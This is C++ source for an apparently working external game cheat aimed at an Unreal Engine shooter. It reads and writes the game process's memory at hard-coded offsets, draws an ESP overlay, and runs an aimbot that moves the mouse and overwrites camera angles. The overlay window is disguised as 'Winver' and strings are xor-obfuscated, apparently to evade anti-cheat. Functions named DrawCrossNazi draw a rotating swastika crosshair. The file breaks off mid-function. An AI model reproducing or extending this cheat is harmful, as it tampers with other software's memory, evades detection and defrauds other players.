/*
	Makfn External V4
	https://github.com/DX9Paster
	Copyright (c) 2022 DX9Paster
	Permission is hereby granted, free of charge, to any person
	obtaining a copy of this software and associated documentation
	files (the "Software"), to deal in the Software without
	restriction, including without limitation the rights to use,
	copy, modify, merge, publish, distribute, sublicense, and/or sell
	copies of the Software, and to permit persons to whom the
	Software is furnished to do so, subject to the following
	conditions:
	The above copyright notice and this permission notice shall be
	included in all copies or substantial portions of the Software.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
	EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
	OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND
	NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
	HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
	WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
	FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
	OTHER DEALINGS IN THE SOFTWARE.
 */

#include "ExternalUtils.h"
#include "d3d9_x.h"
#include <dwmapi.h>
#include <vector>
#include "skStr.h"
#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include "D3DX/d3dx9math.h"
#include <thread>
#include <Windows.h>
#include <direct.h>
#include <string>
#include "skStr.h"
#include "settings.h"
#include <intrin.h>
#include <list>
#include "dtcnerds.h"
#include "defs.h"
#include "xor.hpp"
#include "godfather.h"

RECT GameRect = { NULL };
D3DPRESENT_PARAMETERS d3dpp;
static ImColor cas;
ImFont* Verdana, * DefaultFont;
MSG Message = { NULL };
const MARGINS Margin = { -1 };
HWND game_wnd;
int screen_width;
int screen_height;
static void xCreateWindow();
static void xInitD3d();
static void xMainLoop();                     
static void xShutdown();
static LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam);
extern LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
static HWND Window = NULL;
IDirect3D9Ex* p_Object = NULL;                         
static LPDIRECT3DDEVICE9 D3dDevice = NULL;
static LPDIRECT3DVERTEXBUFFER9 TriBuf = NULL;
int center_x = GetSystemMetrics(0) / 2 - 3;
int center_y = GetSystemMetrics(1) / 2 - 3;
DWORD UDPID;
uintptr_t baseaddy;
DWORD ScreenCenterX;
DWORD ScreenCenterY;
static int aimkeypos = 3;
static int aimbone = 1;
float AimFOV = 180;

namespace actors
{
	DWORD_PTR Uworld;
	DWORD_PTR LocalPawn;
	DWORD_PTR PlayerState;
	DWORD_PTR Localplayer;
	DWORD_PTR Rootcomp;
	DWORD_PTR PlayerController;
	DWORD_PTR Persistentlevel;
	DWORD_PTR Gameinstance;
	DWORD_PTR LocalPlayers;
	uint64_t PlayerCameraManager;
	uint64_t WorldSettings;
	Vector3 localactorpos;
	Vector3 relativelocation;
	Vector3 Relativelocation;
	DWORD_PTR AActors;
	DWORD ActorCount;
}

typedef struct _FNlEntity
{
	uint64_t Actor;
	int ID;
	uint64_t mesh;
}FNlEntity; std::vector<FNlEntity> entityList;

typedef struct _LootEntity {
	std::string GNames;
	uintptr_t ACurrentItem;
}LootEntity; static std::vector<LootEntity> LootentityList;

struct Camera
{
	Vector3 Location;
	Vector3 Rotation;
	float FieldOfView;
}; Camera vCamera;


D3DXMATRIX Matrix(Vector3 rot, Vector3 origin = Vector3(0, 0, 0))
{
	float radPitch = (rot.x * float(M_PI) / 180.f);
	float radYaw = (rot.y * float(M_PI) / 180.f);
	float radRoll = (rot.z * float(M_PI) / 180.f);

	float SP = sinf(radPitch);
	float CP = cosf(radPitch);
	float SY = sinf(radYaw);
	float CY = cosf(radYaw);
	float SR = sinf(radRoll);
	float CR = cosf(radRoll);

	D3DMATRIX matrix;
	matrix.m[0][0] = CP * CY;
	matrix.m[0][1] = CP * SY;
	matrix.m[0][2] = SP;
	matrix.m[0][3] = 0.f;

	matrix.m[1][0] = SR * SP * CY - CR * SY;
	matrix.m[1][1] = SR * SP * SY + CR * CY;
	matrix.m[1][2] = -SR * CP;
	matrix.m[1][3] = 0.f;

	matrix.m[2][0] = -(CR * SP * CY + SR * SY);
	matrix.m[2][1] = CY * SR - CR * SP * SY;
	matrix.m[2][2] = CR * CP;
	matrix.m[2][3] = 0.f;

	matrix.m[3][0] = origin.x;
	matrix.m[3][1] = origin.y;
	matrix.m[3][2] = origin.z;
	matrix.m[3][3] = 1.f;

	return matrix;
}

D3DMATRIX matrixx(D3DMATRIX pM1, D3DMATRIX pM2)
{
	D3DMATRIX pOut;
	pOut._11 = pM1._11 * pM2._11 + pM1._12 * pM2._21 + pM1._13 * pM2._31 + pM1._14 * pM2._41;
	pOut._12 = pM1._11 * pM2._12 + pM1._12 * pM2._22 + pM1._13 * pM2._32 + pM1._14 * pM2._42;
	pOut._13 = pM1._11 * pM2._13 + pM1._12 * pM2._23 + pM1._13 * pM2._33 + pM1._14 * pM2._43;
	pOut._14 = pM1._11 * pM2._14 + pM1._12 * pM2._24 + pM1._13 * pM2._34 + pM1._14 * pM2._44;
	pOut._21 = pM1._21 * pM2._11 + pM1._22 * pM2._21 + pM1._23 * pM2._31 + pM1._24 * pM2._41;
	pOut._22 = pM1._21 * pM2._12 + pM1._22 * pM2._22 + pM1._23 * pM2._32 + pM1._24 * pM2._42;
	pOut._23 = pM1._21 * pM2._13 + pM1._22 * pM2._23 + pM1._23 * pM2._33 + pM1._24 * pM2._43;
	pOut._24 = pM1._21 * pM2._14 + pM1._22 * pM2._24 + pM1._23 * pM2._34 + pM1._24 * pM2._44;
	pOut._31 = pM1._31 * pM2._11 + pM1._32 * pM2._21 + pM1._33 * pM2._31 + pM1._34 * pM2._41;
	pOut._32 = pM1._31 * pM2._12 + pM1._32 * pM2._22 + pM1._33 * pM2._32 + pM1._34 * pM2._42;
	pOut._33 = pM1._31 * pM2._13 + pM1._32 * pM2._23 + pM1._33 * pM2._33 + pM1._34 * pM2._43;
	pOut._34 = pM1._31 * pM2._14 + pM1._32 * pM2._24 + pM1._33 * pM2._34 + pM1._34 * pM2._44;
	pOut._41 = pM1._41 * pM2._11 + pM1._42 * pM2._21 + pM1._43 * pM2._31 + pM1._44 * pM2._41;
	pOut._42 = pM1._41 * pM2._12 + pM1._42 * pM2._22 + pM1._43 * pM2._32 + pM1._44 * pM2._42;
	pOut._43 = pM1._41 * pM2._13 + pM1._42 * pM2._23 + pM1._43 * pM2._33 + pM1._44 * pM2._43;
	pOut._44 = pM1._41 * pM2._14 + pM1._42 * pM2._24 + pM1._43 * pM2._34 + pM1._44 * pM2._44;

	return pOut;
}

bool IsVec3Valid(Vector3 vec3)
{
	return !(vec3.x == 0 && vec3.y == 0 && vec3.z == 0);
}

bool IsInScreen(Vector3 pos, int over = 30) {
	if (pos.x > -over && pos.x < Width + over && pos.y > -over && pos.y < Height + over) {
		return true;
	}
	else {
		return false;
	}
}

float powf_(float _X, float _Y) { return (_mm_cvtss_f32(_mm_pow_ps(_mm_set_ss(_X), _mm_set_ss(_Y)))); }
float sqrtf_(float _X) { return (_mm_cvtss_f32(_mm_sqrt_ps(_mm_set_ss(_X)))); }
double GetDistance(double x1, double y1, double z1, double x2, double y2) { return sqrtf(powf((x2 - x1), 2) + powf_((y2 - y1), 2)); }

bool isVisible(uint64_t mesh) {
	float tik = read<float>(mesh + 0x330);
	float tok = read<float>(mesh + 0x334);
	const float tick = 0.06f;
	return tok + tick >= tik;
}

FTransform GetBoneIndex(DWORD_PTR mesh, int index)
{
	DWORD_PTR bonearray;
	bonearray = read<DWORD_PTR>(mesh + 0x5b8);

	if (bonearray == NULL)
	{
		bonearray = read<DWORD_PTR>(mesh + 0x5b8 + 0x10);  //(mesh + 0x5e8) + 0x5a));
	}
	return read<FTransform>(bonearray + (index * 0x60));
}

Vector3 GetBoneWithRotation(DWORD_PTR mesh, int id)
{
	FTransform bone = GetBoneIndex(mesh, id);
	FTransform ComponentToWorld = read<FTransform>(mesh + 0x240);

	D3DMATRIX Matrix;
	Matrix = MatrixMultiplication(bone.ToMatrixWithScale(), ComponentToWorld.ToMatrixWithScale());

	return Vector3(Matrix._41, Matrix._42, Matrix._43);
}

static std::string readGetNameFromFName(int key) {
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(baseaddy + 0xe145cc0 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset);
	uint16_t nameEntry = read<uint16_t>(NamePoolChunk);

	int nameLength = nameEntry >> 6;
	char buff[1024];
	if ((uint32_t)nameLength)
	{
		for (int x = 0; x < nameLength; ++x)
		{
			buff[x] = read<char>(NamePoolChunk + 4 + x);
		}

		char* v2 = buff; // rdi 
		__int64 result; // rax 
		unsigned int v5 = nameLength; // ecx 
		__int64 v6; // r8 
		char v7; // cl 
		unsigned int v8; // eax 

		result = 22i64;
		if (v5)
		{
			v6 = v5;
			do
			{
				v7 = *v2++;
				v8 = result + 45297;
				*(v2 - 1) = v8 + ~v7;
				result = (v8 << 8) | (v8 >> 8);
				--v6;
			} while (v6);
		}

		buff[nameLength] = '\0';
		return std::string(buff);
	}
	else {
		return "";
	}
}

static std::string GetNameFromFName(int key)
{
	uint32_t ChunkOffset = (uint32_t)((int)(key) >> 16);
	uint16_t NameOffset = (uint16_t)key;

	uint64_t NamePoolChunk = read<uint64_t>(baseaddy + 0xe145cc0 + (8 * ChunkOffset) + 16) + (unsigned int)(4 * NameOffset); //((ChunkOffset + 2) * 8) ERROR_NAME_SIZE_EXCEEDED
	if (read<uint16_t>(NamePoolChunk) < 64)
	{
		auto a1 = read<DWORD>(NamePoolChunk + 4);
		return readGetNameFromFName(a1);
	}
	else
	{
		return readGetNameFromFName(key);
	}
}

Camera GetCamera(__int64 a1)
{
	Camera FGC_Camera;
	__int64 v1;
	__int64 v6;
	__int64 v7;
	__int64 v8;

	v1 = read<__int64>(actors::Localplayer + 0xd0);
	__int64 v9 = read<__int64>(v1 + 0x8); // 0x10

	FGC_Camera.FieldOfView = 80.f / (read<double>(v9 + 0x620) / 1.19f); // 0x600

	FGC_Camera.Rotation.x = read<double>(v9 + 0x870);
	FGC_Camera.Rotation.y = read<double>(a1 + 0x148);

	uint64_t FGC_Pointerloc = read<uint64_t>(actors::Uworld + 0x110);
	FGC_Camera.Location = read<Vector3>(FGC_Pointerloc);

	return FGC_Camera;
}

Vector3 W2S(Vector3 WorldLocation)
{
	Camera vCamera = GetCamera(actors::Rootcomp);
	vCamera.Rotation.x = (asin(vCamera.Rotation.x)) * (180.0 / M_PI);
	Vector3 Camera;

	D3DMATRIX tempMatrix = Matrix(vCamera.Rotation);

	Vector3 vAxisX = Vector3(tempMatrix.m[0][0], tempMatrix.m[0][1], tempMatrix.m[0][2]);
	Vector3 vAxisY = Vector3(tempMatrix.m[1][0], tempMatrix.m[1][1], tempMatrix.m[1][2]);
	Vector3 vAxisZ = Vector3(tempMatrix.m[2][0], tempMatrix.m[2][1], tempMatrix.m[2][2]);

	Vector3 vDelta = WorldLocation - vCamera.Location;
	Vector3 vTransformed = Vector3(vDelta.Dot(vAxisY), vDelta.Dot(vAxisZ), vDelta.Dot(vAxisX));

	if (vTransformed.z < 1.f)
		vTransformed.z = 1.f;

	return Vector3((Width / 2.0f) + vTransformed.x * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, (Height / 2.0f) - vTransformed.y * (((Width / 2.0f) / tanf(vCamera.FieldOfView * (float)M_PI / 360.f))) / vTransformed.z, 0);
}

std::wstring MBytesToWString(const char* lpcszString)
{
	int len = strlen(lpcszString);
	int unicodeLen = ::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, NULL, 0);
	wchar_t* pUnicode = new wchar_t[unicodeLen + 1];
	memset(pUnicode, 0, (unicodeLen + 1) * sizeof(wchar_t));
	::MultiByteToWideChar(CP_ACP, 0, lpcszString, -1, (LPWSTR)pUnicode, unicodeLen);
	std::wstring wString = (wchar_t*)pUnicode;
	delete[] pUnicode;
	return wString;
}

std::string WStringToUTF8(const wchar_t* lpwcszWString)
{
	char* pElementText;
	int iTextLen = ::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, NULL, 0, NULL, NULL);
	pElementText = new char[iTextLen + 1];
	memset((void*)pElementText, 0, (iTextLen + 1) * sizeof(char));
	::WideCharToMultiByte(CP_UTF8, 0, (LPWSTR)lpwcszWString, -1, pElementText, iTextLen, NULL, NULL);
	std::string strReturn(pElementText);
	delete[] pElementText;
	return strReturn;
}

void DrawStrokeText(int x, int y, const char* str)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);

	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x - 1, y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x + 1, y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), utf_8_2.c_str());
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(255, 255, 255, 255)), utf_8_2.c_str());
}

void DrawText1(int x, int y, const char* str, RGBA* color)
{
	ImFont a;
	std::string utf_8_1 = std::string(str);
	std::string utf_8_2 = string_To_UTF8(utf_8_1);
	ImGui::GetOverlayDrawList()->AddText(ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), utf_8_2.c_str());
}

void DrawLine(int x1, int y1, int x2, int y2, RGBA* color, int thickness) { ImGui::GetOverlayDrawList()->AddLine(ImVec2(x1, y1), ImVec2(x2, y2), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), thickness); }
void DrawFilledRect(int x, int y, int w, int h, ImU32 color) { ImGui::GetOverlayDrawList()->AddRectFilled(ImVec2(x, y), ImVec2(x + w, y + h), color, 0, 0); }
void DrawCircle(int x, int y, int radius, RGBA* color, int segments) { ImGui::GetOverlayDrawList()->AddCircle(ImVec2(x, y), radius, ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 255.0, color->B / 255.0, color->A / 255.0)), segments); }
void DrawBox(float X, float Y, float W, float H, ImU32 Col) { ImGui::GetOverlayDrawList()->AddRect(ImVec2(X + 1, Y + 1), ImVec2(((X + W) - 1), ((Y + H) - 1)), Col); ImGui::GetOverlayDrawList()->AddRect(ImVec2(X, Y), ImVec2(X + W, Y + H), Col); }

void DrawString(float fontSize, int x, int y, RGBA* color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 4;
		y = y - textSize.y;
	}
	if (stroke)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), ImGui::ColorConvertFloat4ToU32(ImVec4(color->R / 255.0, color->G / 153.0, color->B / 51.0, color->A / 255.0)), text.c_str());
}

void DrawCrossNazi1(int buyukluk, DWORD color)
{
	ImVec2 window_pos = ImGui::GetWindowPos();
	ImVec2 window_size = ImGui::GetWindowSize();
	int crosspozisyon = window_pos.x + window_size.x * 0.5f;
	int crosspozisyony = window_pos.y + window_size.y * 0.5f;
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon, crosspozisyony - buyukluk), ImVec2(crosspozisyon, crosspozisyony + buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon - buyukluk, crosspozisyony), ImVec2(crosspozisyon + buyukluk, crosspozisyony), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon, crosspozisyony + buyukluk), ImVec2(crosspozisyon - buyukluk, crosspozisyony + buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon, crosspozisyony - buyukluk), ImVec2(crosspozisyon + buyukluk, crosspozisyony - buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon - buyukluk, crosspozisyony), ImVec2(crosspozisyon - buyukluk, crosspozisyony - buyukluk), ImColor(color));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(crosspozisyon + buyukluk, crosspozisyony), ImVec2(crosspozisyon + buyukluk, crosspozisyony + buyukluk), ImColor(color));
}

void DrawNormalBox(int x, int y, int w, int h, int borderPx, ImU32 color)
{
	DrawFilledRect(x + borderPx, y, w, borderPx, color); //top 
	DrawFilledRect(x + w - w + borderPx, y, w, borderPx, color); //top 
	DrawFilledRect(x, y, borderPx, h, color); //left 
	DrawFilledRect(x, y + h - h + borderPx * 2, borderPx, h, color); //left 
	DrawFilledRect(x + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	DrawFilledRect(x + w - w + borderPx, y + h + borderPx, w, borderPx, color); //bottom 
	DrawFilledRect(x + w + borderPx, y, borderPx, h, color);//right 
	DrawFilledRect(x + w + borderPx, y + h - h + borderPx * 2, borderPx, h, color);//right 
}

void DrawCorneredBox(int X, int Y, int W, int H, const ImU32& color, int thickness) {
	float lineW = (W / 3);
	float lineH = (H / 3);

	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::ColorConvertFloat4ToU32(ImVec4(1 / 255.0, 1 / 255.0, 1 / 255.0, 255 / 255.0)), 3);

	//corners
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y), ImVec2(X + lineW, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y), ImVec2(X + W, Y), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y), ImVec2(X + W, Y + lineH), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H - lineH), ImVec2(X, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X, Y + H), ImVec2(X + lineW, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W - lineW, Y + H), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(X + W, Y + H - lineH), ImVec2(X + W, Y + H), ImGui::GetColorU32(color), thickness);
}

float BOG_TO_GRD(float BOG) { return (180 / M_PI) * BOG; }
float GRD_TO_BOG(float GRD) { return (M_PI / 180) * GRD;  }
int faken_rot = 0;

void DrawCrossNazi(int buyukluk, DWORD color)
{
	POINT Screen; int oodofdfo, jbjfdbdsf;
	Screen.x = GetSystemMetrics(0);
	Screen.y = GetSystemMetrics(1);
	//Middle POINT
	POINT Middle; Middle.x = (int)(Screen.x / 2); Middle.y = (int)(Screen.y / 2);
	int a = (int)(Screen.y / 2 / 30);
	float gamma = atan(a / a);
	faken_rot++;
	int Drehungswinkel = faken_rot;

	int i = 0;
	while (i < 4)
	{
		std::vector <int> p;
		p.push_back(a * sin(GRD_TO_BOG(Drehungswinkel + (i * 90))));									//p[0]		p0_A.x
		p.push_back(a * cos(GRD_TO_BOG(Drehungswinkel + (i * 90))));									//p[1]		p0_A.y
		p.push_back((a / cos(gamma)) * sin(GRD_TO_BOG(Drehungswinkel + (i * 90) + BOG_TO_GRD(gamma))));	//p[2]		p0_B.x
		p.push_back((a / cos(gamma)) * cos(GRD_TO_BOG(Drehungswinkel + (i * 90) + BOG_TO_GRD(gamma))));	//p[3]		p0_B.y

		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Middle.x, Middle.y), ImVec2(Middle.x + p[0], Middle.y - p[1]), ImColor(255, 0, 0, 255));
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Middle.x + p[0], Middle.y - p[1]), ImVec2(Middle.x + p[2], Middle.y - p[3]), ImColor(255, 0, 0, 255));

		i++;
	}
}

void DrawStringImColor(float fontSize, int x, int y, ImColor color, bool bCenter, bool stroke, const char* pText, ...)
{
	va_list va_alist;
	char buf[1024] = { 0 };
	va_start(va_alist, pText);
	_vsnprintf_s(buf, sizeof(buf), pText, va_alist);
	va_end(va_alist);
	std::string text = WStringToUTF8(MBytesToWString(buf).c_str());
	if (bCenter)
	{
		ImVec2 textSize = ImGui::CalcTextSize(text.c_str());
		x = x - textSize.x / 4;
		y = y - textSize.y;
	}
	if (stroke)
	{
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x + 1, y - 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
		ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x - 1, y + 1), ImGui::ColorConvertFloat4ToU32(ImVec4(0, 0, 0, 1)), text.c_str());
	}
	ImGui::GetOverlayDrawList()->AddText(ImGui::GetFont(), fontSize, ImVec2(x, y), color, text.c_str());
}

char* wchar_to_char(const wchar_t* pwchar)
{
	int currentCharIndex = 0;
	char currentChar = pwchar[currentCharIndex];

	while (currentChar != '\0')
	{
		currentCharIndex++;
		currentChar = pwchar[currentCharIndex];
	}

	const int charCount = currentCharIndex + 1;

	char* filePathC = (char*)malloc(sizeof(char) * charCount);

	for (int i = 0; i < charCount; i++)
	{
		char character = pwchar[i];

		*filePathC = character;

		filePathC += sizeof(char);

	}
	filePathC += '\0';

	filePathC -= (sizeof(char) * charCount);

	return filePathC;
}

void SetWindowToTarget()
{
	while (true)
	{
		if (hwnd)
		{
			ZeroMemory(&GameRect, sizeof(GameRect));
			GetWindowRect(hwnd, &GameRect);
			Width = GameRect.right - GameRect.left;
			Height = GameRect.bottom - GameRect.top;
			DWORD dwStyle = GetWindowLong(hwnd, GWL_STYLE);

			if (dwStyle & WS_BORDER)
			{
				GameRect.top += 32;
				Height -= 39;
			}
			ScreenCenterX = Width / 2;
			ScreenCenterY = Height / 2;
			MoveWindow(Window, GameRect.left, GameRect.top, Width, Height, true);
		}
		else
		{
			exit(0);
		}
	}
}

void setup_window()
{
	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)SetWindowToTarget, 0, 0, 0);

	WNDCLASSEX wc;
	ZeroMemory(&wc, sizeof(wc));
	wc.cbSize = sizeof(wc);
	wc.lpszClassName = L"About Windows";
	wc.lpfnWndProc = WinProc;
	RegisterClassEx(&wc);

	if (hwnd)
	{
		GetClientRect(hwnd, &GameRect);
		POINT xy;
		ClientToScreen(hwnd, &xy);
		GameRect.left = xy.x;
		GameRect.top = xy.y;

		Width = GameRect.right;
		Height = GameRect.bottom;
	}
	else
		exit(2);

	Window = CreateWindowEx(NULL, L"About Windows", L"Winver", WS_POPUP | WS_VISIBLE, 0, 0, Width, Height, 0, 0, 0, 0);

	DwmExtendFrameIntoClientArea(Window, &Margin);
	SetWindowLong(Window, GWL_EXSTYLE, WS_EX_TRANSPARENT | WS_EX_TOOLWINDOW | WS_EX_LAYERED);
	ShowWindow(Window, SW_SHOW);
	UpdateWindow(Window);
}


void xInitD3d()
{
	if (FAILED(Direct3DCreate9Ex(D3D_SDK_VERSION, &p_Object)))
		exit(3);

	ZeroMemory(&d3dpp, sizeof(d3dpp));
	d3dpp.BackBufferWidth = Width;
	d3dpp.BackBufferHeight = Height;
	d3dpp.BackBufferFormat = D3DFMT_A8R8G8B8;
	d3dpp.MultiSampleQuality = D3DMULTISAMPLE_NONE;
	d3dpp.AutoDepthStencilFormat = D3DFMT_D16;
	d3dpp.SwapEffect = D3DSWAPEFFECT_DISCARD;
	d3dpp.EnableAutoDepthStencil = TRUE;
	d3dpp.hDeviceWindow = Window;
	d3dpp.Windowed = TRUE;

	p_Object->CreateDevice(D3DADAPTER_DEFAULT, D3DDEVTYPE_HAL, Window, D3DCREATE_SOFTWARE_VERTEXPROCESSING, &d3dpp, &D3dDevice);

	IMGUI_CHECKVERSION();

	ImGui::CreateContext();

	ImGui_ImplWin32_Init(Window);
	ImGui_ImplDX9_Init(D3dDevice);
	auto& style = ImGui::GetStyle();
	ImGuiIO& io = ImGui::GetIO(); (void)io;

	ImGui::GetIO().Fonts->AddFontFromFileTTF(_("C:\\Windows\\Fonts\\Tahoma.ttf"), 15);


    p_Object->Release();
}

void SetMouseAbsPosition(DWORD x, DWORD y)
{
	INPUT input = { 0 };
	input.type = INPUT_MOUSE;
	input.mi.dwFlags = MOUSEEVENTF_MOVE;
	input.mi.dx = x;
	input.mi.dy = y;
	SendInput(1, &input, sizeof(input));
}

void WriteAngles(Vector3 CameraLocation, Vector3 TargetLocation)
{
	Vector3 VectorPos = TargetLocation - CameraLocation;

	float distance = (double)(sqrtf(VectorPos.x * VectorPos.x + VectorPos.y * VectorPos.y + VectorPos.z * VectorPos.z));

	float x, y, z;
	x = -((acosf(VectorPos.z / distance) * (float)(180.0f / 3.14159265358979323846264338327950288419716939937510)) - 90.f);
	y = atan2f(VectorPos.y, VectorPos.x) * (float)(180.0f / 3.14159265358979323846264338327950288419716939937510);
	z = 0;


	write<float>(0x338 + 0x3314, x); //PlayerCameraManager::ViewPitchMin 0x3314
	write<float>(0x338 + 0x3318, x); //PlayerCameraManager::ViewPitchMax 0x3318
	write<float>(0x338 + 0x331C, y); //PlayerCameraManager::ViewYawMin 0x331C
	write<float>(0x338 + 0x3320, y); //PlayerCameraManager::ViewYawMax 0x3320

	//0x338 -> PlayerController::PlayerCameraManager 0x338
}

void aimbot(float x, float y)
{
	float ScreenCenterX = (Width / 2);
	float ScreenCenterY = (Height / 2);
	int AimSpeed = smooth;
	float TargetX = 0;
	float TargetY = 0;

	if (x != 0)
	{
		if (x > ScreenCenterX)
		{
			TargetX = -(ScreenCenterX - x);
			TargetX /= AimSpeed;
